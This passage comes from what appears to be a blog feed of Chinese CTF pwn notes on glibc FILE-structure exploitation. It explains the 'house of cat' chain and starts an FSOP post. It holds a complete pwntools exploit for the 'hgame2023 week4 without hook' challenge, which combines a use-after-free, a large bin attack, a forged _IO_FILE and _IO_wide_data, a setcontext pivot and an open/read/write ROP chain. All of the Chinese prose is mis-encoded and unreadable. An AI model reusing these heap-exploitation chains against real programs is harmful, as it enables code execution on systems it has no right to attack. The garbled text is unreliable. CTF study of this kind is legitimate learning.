function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>  assertion, &amp;total) &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      (<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s&quot;</span>, str);<br>      (<span class="hljs-type">void</span>) fflush (<span class="hljs-built_in">stderr</span>);<br>â€¦â€¦<br></code></pre></td></tr></table></figure></li></ul><p>ç»¼ä¸Šï¼Œ2.36æ— æ³•ä½¿ç”¨assertè§¦å‘æ¼æ´ï¼Œ2.35ä»¥å‰å’Œ2.37å¯ä»¥<br>åˆ©ç”¨__malloc_assertä¸­æ‰§è¡Œçš„fflushå‡½æ•°ï¼ˆä¸ç”¨åœ¨æ„stderrï¼Œä¹‹åè¿™ä¸ªå‚æ•°å°±æ²¡æœ‰ç”¨äº†ï¼‰è§¦å‘æ¼æ´<br>ä¸»è¦ä½¿ç”¨çš„è§¦å‘assertçš„éƒ¨åˆ†åœ¨sysmallocä¸­ã€‚åœ¨_int_mallocä¸­ï¼Œå¦‚æœtop chunkä¸å¤Ÿåˆ†é…ä¼šè°ƒç”¨sysmallocï¼Œåœ¨sysmallocä¸­å¦‚æœè¯·æ±‚å¤§å°å°äºmp_.mmap_thresholdï¼ˆ0x20000ï¼‰ä¼šæ‹“å±•top chunkï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªassert</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>         prev_inuse (old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>è§¦å‘æ¡ä»¶ï¼š</p><ul><li>top chunkå¤§å°å°äºMINSIZEï¼ˆ0x20ï¼‰</li><li>pre_inuseä½ä¸º0</li><li>top chunkæ²¡æœ‰é¡µå¯¹é½</li></ul><h3 id="å…³äºvtable"><a href="#å…³äºvtable" class="headerlink" title="å…³äºvtable"></a>å…³äºvtable</h3><p>2.24å¢åŠ äº†å¯¹vtableä½ç½®çš„æ£€æŸ¥ï¼Œ2.28åˆå°†å¸¸åˆ©ç”¨çš„ç›¸å¯¹åœ°å€å¼•ç”¨æ›¿æ¢æˆäº†mallocå’Œfreeï¼Œå µæ­»äº†è¿™æ¡è°ƒç”¨é“¾<br>çœ‹ä¸€çœ¼è·³è½¬è¡¨çš„å®å®šä¹‰ï¼Œå‘ç°åªæœ‰JUMPè·³è½¬æœ‰vtableæ£€æŸ¥ï¼Œè€ŒWJUMPæ²¡æœ‰</p><img src="/2023/02/24/house-of-cat/jump.png" class title="jump"><p>_IO_wfile_jumpsç»“æ„ä½“ä½¿ç”¨WJUMPï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä¼ªé€ _IO_wfile_jumpsçš„vtableï¼Œ_IO_wfile_jumpsç»“æ„ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.37\libio\wfileops.c</span><br><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_wfile_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_new_file_finish),<br>  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),<br>  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),<br>  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),<br>  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),<br>  JUMP_INIT(xsputn, _IO_wfile_xsputn),<br>  JUMP_INIT(xsgetn, _IO_file_xsgetn),<br>  JUMP_INIT(seekoff, _IO_wfile_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_new_file_setbuf),<br>  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),<br>  JUMP_INIT(doallocate, _IO_wfile_doallocate),<br>  JUMP_INIT(read, _IO_file_read),<br>  JUMP_INIT(write, _IO_new_file_write),<br>  JUMP_INIT(seek, _IO_file_seek),<br>  JUMP_INIT(close, _IO_file_close),<br>  JUMP_INIT(stat, _IO_file_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>_IO_wfile_jumpsç»“æ„ä½“ä¸­çš„_IO_wfile_seekoffæºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.37\libio\wfileops.c</span><br><br><span class="hljs-type">off64_t</span><br>_IO_wfile_seekoff (FILE *fp, <span class="hljs-type">off64_t</span> offset, <span class="hljs-type">int</span> dir, <span class="hljs-type">int</span> mode)<br>&#123;<br>  <span class="hljs-type">off64_t</span> result;<br>  <span class="hljs-type">off64_t</span> delta, new_offset;<br>  <span class="hljs-type">long</span> <span class="hljs-type">int</span> count;<br><br>  <span class="hljs-keyword">if</span> (mode == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> do_ftell_wide (fp);<br><br>  <span class="hljs-type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base<br>== fp-&gt;_wide_data-&gt;_IO_read_end)<br>       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base<br>   == fp-&gt;_wide_data-&gt;_IO_write_ptr));<br><br>  <span class="hljs-type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr<br>       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)<br>      || _IO_in_put_mode (fp));<br><br>  <span class="hljs-keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))<br>    <span class="hljs-keyword">return</span> WEOF;<br>â€¦â€¦<br></code></pre></td></tr></table></figure><p>è¦è°ƒç”¨_IO_switch_to_wget_modeå¿…é¡»è¦é€šè¿‡was_writingçš„æ£€æŸ¥ï¼Œå³fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base<br>_IO_switch_to_wget_modeæºç å¦‚ä¸‹ï¼Œ_IO_WOVERFLOWæ˜¯é€šè¿‡è·³è½¬è¡¨è°ƒç”¨çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.37\libio\wgenops.c</span><br><br><span class="hljs-type">int</span><br>_IO_switch_to_wget_mode (FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)<br>      <span class="hljs-keyword">return</span> EOF;<br>â€¦â€¦<br></code></pre></td></tr></table></figure><p>å†çœ‹çœ‹_IO_switch_to_wget_modeçš„æ±‡ç¼–ä»£ç ï¼š</p><img src="/2023/02/24/house-of-cat/switch.png" class title="switch"><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡rdiæ§åˆ¶rdxå’Œraxï¼Œåœ¨æœ‰æ²™ç®±çš„æƒ…å†µä¸‹è°ƒç”¨setcontext<br>å…·ä½“åˆ©ç”¨è¿‡ç¨‹è§ä¾‹é¢˜   </p><h2 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__malloc_assert(<span class="hljs-built_in">exit</span>)-&gt;_IO_flush_all_lockp(fflush)-&gt;_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode-&gt;setcontext(system)<br></code></pre></td></tr></table></figure><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="hgame2023-week4-without-hook"><a href="#hgame2023-week4-without-hook" class="headerlink" title="hgame2023 week4 without hook"></a>hgame2023 week4 without hook</h2><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>uafä¸è§£é‡Šäº†ï¼Œç›´æ¥å¼€å§‹<br>æ³„éœ²libcå’Œå †åœ°å€å°±ä¸è¯´äº†ï¼Œlarge bin attackå°†å †åœ°å€å†™å…¥_IO_list_allç„¶åè°ƒç”¨exitæ­£å¸¸é€€å‡º<br>æ¥ä¸‹æ¥å°±æ˜¯ç–¯ç‹‚è°ƒè¯•ä¼ªé€ _IO_FILE_plusç»“æ„ä½“ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p><ul><li>fp-&gt;_mode&lt;&#x3D;0ï¼Œfp-&gt;_IO_write_ptr&gt;fp-&gt;_IO_write_base</li><li>vtableæŒ‡å‘_IO_wfile_jumps+48ï¼ˆåˆ©ç”¨åç§»ä½¿_IO_flush_all_lockpè°ƒç”¨_IO_OVERFLOWå®é™…è¿›å…¥_IO_wfile_seekoff</li><li>å‡½æ•°è¿›å…¥_IO_switch_to_wget_modeï¼Œè¦æ±‚ä¼ªé€ fp-&gt;_wide_data<img src="/2023/02/24/house-of-cat/IO_FILE_plus.png" class title="IO_FILE_plus"></li><li>ä¼ªé€ _IO_wide_dataç»“æ„ä½“ï¼Œ_wide_data-&gt;_IO_write_ptr&gt;_wide_data-&gt;_IO_write_base</li><li>ä¼ªé€ vtableæŒ‡å‘å †åœ°å€ï¼Œåˆ©ç”¨_IO_WOVERFLOWæŒ‡å‘setcontext+53<img src="/2023/02/24/house-of-cat/IO_wide_data.png" class title="IO_wide_data"></li><li>å¯„å­˜å™¨å¸ƒç½®è¾¹è°ƒè¯•è¾¹æ”¹å°±è¡Œ</li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>p=process(<span class="hljs-string">&#x27;./hook&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment">#large bin attack change _IO_list_all</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x550</span>)<span class="hljs-comment">#p1</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<span class="hljs-comment">#pad</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x540</span>)<span class="hljs-comment">#p2</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<span class="hljs-comment">#pad</span><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libcbase=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x1d2cc0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<span class="hljs-comment">#p3</span><br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>_IO_list_all=libcbase+libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>setcontext=libcbase+<span class="hljs-number">0x40eb5</span><br>ret_addr=libcbase+<span class="hljs-number">0x270c2</span><br>edit(<span class="hljs-number">0</span>,p64(libcbase+<span class="hljs-number">0x1d3100</span>)+p64(libcbase+<span class="hljs-number">0x1d3100</span>)+p64(heap)+p64(_IO_list_all-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x800</span>)<br>heap=heap-<span class="hljs-number">0x290</span>+<span class="hljs-number">0xd00</span><br>fake_IO=<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">1</span>)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0xa0</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(heap+<span class="hljs-number">0xe0</span>)+p64(heap+<span class="hljs-number">0x200</span>)+p64(ret_addr)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0xc0</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0xd8</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(libcbase+<span class="hljs-number">0x1cf0a0</span>+<span class="hljs-number">0x30</span>)<br>fake_IO_wide=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span><br>fake_IO_wide+=p64(heap+<span class="hljs-number">8</span>)<br>fake_IO_wide=fake_IO_wide.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_wide+=p64(heap+<span class="hljs-number">0x1c8</span>)<br>fake_IO+=fake_IO_wide<br>fake_IO+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(setcontext)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0x200</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>read_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>open_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>rdi_addr=libcbase+<span class="hljs-number">0x27725</span><br>rsi_addr=libcbase+<span class="hljs-number">0x28ed9</span><br>rdx_addr=libcbase+<span class="hljs-number">0xfdd4d</span><br>fake_IO+=p64(rdi_addr)+p64(heap+<span class="hljs-number">0x10</span>)+p64(rsi_addr)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>fake_IO+=p64(rdi_addr)+p64(<span class="hljs-number">3</span>)+p64(rsi_addr)+p64(heap+<span class="hljs-number">0x10</span>)+p64(rdx_addr)+p64(<span class="hljs-number">0x30</span>)+p64(read_addr)<br>fake_IO+=p64(rdi_addr)+p64(<span class="hljs-number">1</span>)+p64(rsi_addr)+p64(heap+<span class="hljs-number">0x10</span>)+p64(rdx_addr)+p64(<span class="hljs-number">0x30</span>)+p64(write_addr)<br>edit(<span class="hljs-number">2</span>,fake_IO)<br>gdb.attach(p)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.interactive()<br>pause()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>IO</category>
      
    </categories>
    
    
    <tags>
      
      <tag>io</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FSOP</title>
    <link href="/2023/02/20/FSOP/"/>
    <url>/2023/02/20/FSOP/</url>
    
    <content type="html"><![CDATA[<p>å¼€â€”â€”å­¦â€”â€”å•¦â€”â€”çœŸâ€”â€”å¼€â€”â€”å¿ƒâ€”â€”å•Šâ€”â€”o(<em>ï¿£â–½ï¿£</em>)ãƒ–<br>IOçš„å­¦ä¹ ä¹Ÿæ­£å¼å¼€å§‹äº†ï¼Œå¼€å­¦ä¹Ÿè¦ç»§ç»­åŠ æ²¹ï¼ç¦æ­¢æ‘†çƒ‚ï¼(à¸‡ â€¢_â€¢)à¸‡</p><span id="more"></span><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><h3 id="vtableåŠ«æŒ"><a href="#vtableåŠ«æŒ" class="headerlink" title="vtableåŠ«æŒ"></a>vtableåŠ«æŒ</h3><p>è®¸å¤šIOç›¸å…³å‡½æ•°éƒ½è°ƒç”¨äº†_IO_FILE_plusç»“æ„ä½“ä¸­çš„vtableæŒ‡é’ˆæŒ‡å‘çš„è·³è½¬è¡¨ä¸­çš„å‡½æ•°ï¼Œå¦‚æœèƒ½å¤ŸåŠ«æŒvtableé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½æ”¹å˜ç¨‹åºæµ<br>åŠ«æŒvtableæœ‰ä¸¤ç§æ–¹å¼ï¼Œåªä¿®æ”¹_IO_FILEç»“æ„ä½“çš„vtableæŒ‡é’ˆæˆ–è€…ç›´æ¥ä¼ªé€ æ•´ä¸ª_IO_FILEç»“æ„ä½“</p><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>å…¨å±€å˜é‡_IO_list_allåˆ©ç”¨å•é“¾è¡¨ç®¡ç†æ‰€æœ‰_IO_FILEç»“æ„ä½“ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶_IO_list_allæˆ–è€…æ§åˆ¶æŸä¸ª_IO_FILEçš„_chainæŒ‡é’ˆï¼Œæˆ‘ä»¬å°±èƒ½è¿›è¡Œä¼ªé€ _IO_FILEç»“æ„ä½“çš„vtableåŠ«æŒ<br>_IO_flush_all_lockpå‡½æ•°ç”¨äºåˆ·æ–°æ‰€æœ‰FILEç»“æ„ä½“çš„è¾“å‡ºç¼“å†²åŒºï¼Œæºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *<span class="hljs-title">fp</span>;</span><br>  <span class="hljs-type">int</span> last_stamp;<br><br>  last_stamp = _IO_list_all_stamp;<br>  fp = (_IO_FILE *) _IO_list_all;<br>  <span class="hljs-keyword">while</span> (fp != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_flockfile (fp);<br><br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>   )<span class="hljs-comment">//å¦‚æœè¾“å‡ºç¼“å†²åŒºæœ‰æ•°æ®ï¼Œåˆ™è°ƒç”¨_IO_OVERFLOWåˆ·æ–°è¾“å‡ºç¼“å†²åŒº</span><br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>result = EOF;<br><br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-keyword">if</span> (last_stamp != _IO_list_all_stamp)<br>&#123;<br>  <span class="hljs-comment">/* Something was added to the list.  Start all over again.  */</span><br>  fp = (_IO_FILE *) _IO_list_all;<br>  last_stamp = _IO_list_all_stamp;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>fp = fp-&gt;_chain;<span class="hljs-comment">//éå†å•é“¾è¡¨</span><br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  <span class="hljs-keyword">if</span> (do_lock)<br>    _IO_lock_unlock (list_all_lock);<br>  __libc_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨_IO_flush_all_lockpçš„è¿‡ç¨‹æœ‰ï¼š</p><ul><li>libcæ‰§è¡Œabortå‡½æ•°æ—¶ï¼Œå †éæ³•æ“ä½œå¯è§¦å‘ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">fflush(_IO_fflush)-&gt;_IO_flush_all-&gt;_IO_flush_all_lockp<br><span class="hljs-built_in">abort</span><br>__libc_message<br>malloc_printerr<br></code></pre></td></tr></table></figure></li><li>è°ƒç”¨exitå‡½æ•°æ—¶<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp<br>_IO_cleanup<br>_run_exit_handlers<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure></li><li>ç¨‹åºæ­£å¸¸é€€å‡ºæ—¶ï¼ˆåŒè°ƒç”¨exitï¼Œå› ä¸ºç¨‹åºæ­£å¸¸é€€å‡ºçš„æ—¶å€™ä¼šè°ƒç”¨exitï¼‰<br>æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹å°±æ˜¯åŠ«æŒ_IO_list_allæˆ–è€…æŸä¸ª_IO_FILEçš„_chainæŒ‡é’ˆï¼Œç„¶åé€šè¿‡ä»¥ä¸Šä¸‰ç§æ–¹å¼è§¦å‘_IO_flush_all_lockpå‡½æ•°è°ƒç”¨</li></ul><h3 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">malloc_printerr-&gt;__libc_message-&gt;<span 